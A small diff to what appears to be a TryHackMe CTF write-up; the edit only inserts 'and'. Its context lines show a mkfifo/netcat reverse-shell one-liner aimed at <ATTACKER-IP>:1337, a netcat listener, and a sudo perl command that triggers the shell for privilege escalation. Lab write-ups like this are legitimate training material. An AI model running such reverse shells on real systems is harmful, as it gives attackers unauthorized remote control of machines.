@@ -196,7 +196,7 @@ www-data@THM-Chal:/etc$ cat copy.sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ATTACKER-IP> 1337 >/tmp/f
 www-data@THM-Chal:/etc$ 
 ```
--> setup a listener `nc -lvnp 1337` on the attacker-machine `www-data@THM-Chal:/etc$ sudo /usr/bin/perl /home/itguy/backup.pl`
+-> setup a listener `nc -lvnp 1337` on the attacker-machine and `www-data@THM-Chal:/etc$ sudo /usr/bin/perl /home/itguy/backup.pl`
 
 ```
 kali@kali:~$ nc -lvnp 1337
